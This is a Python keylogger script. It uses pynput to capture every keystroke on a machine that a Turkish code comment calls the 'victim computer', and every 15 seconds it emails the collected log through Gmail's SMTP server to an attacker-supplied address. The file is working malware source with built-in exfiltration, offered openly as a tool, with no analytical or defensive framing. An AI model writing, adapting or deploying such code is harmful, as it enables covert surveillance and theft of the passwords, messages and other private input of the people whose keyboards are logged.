import pynput.keyboard
import smtplib
import threading , optparse

log=""
def options():
    parser = optparse.OptionParser();
    parser.add_option("-m","--mail_address",dest="mail",help="put the mail address")
    parser.add_option("-p","--password",dest="password",help="enter the password");
    (parameters,arguments) = parser.parse_args();
    return parameters

parameters_default = options();
mail_address = parameters_default.mail;
password = parameters_default.password;

def callback_function(key):
    global log;

    try:
        log = log + str(key.char)
        log = log + key.char.encode("utf-8")


    except AttributeError:

        if key == key.space:
            log = log + " "
        else :
            print("Special key {0} was pressed".format(key));
            log = log + str(key);

    except:
        print("Unknown key pressed !!!");
        pass;
    print(log);

def send_mail(mail,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587);
    email_server.starttls();
    email_server.login(mail,password);
    email_server.sendmail(mail,mail,message);
    email_server.quit();
def threading_function():
    global log,mail_address,password;

    send_mail(mail_address,password,log.encode("utf-8"));
    log = "";
    timer_object = threading.Timer(15,threading_function);
    timer_object.start();


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

# threading    kurban bilgisayar ayni anda bir suru isem yapabiliyo bu nedenle bilgisayari takilmiyo
with keylogger_listener:
    threading_function()
    keylogger_listener.join();
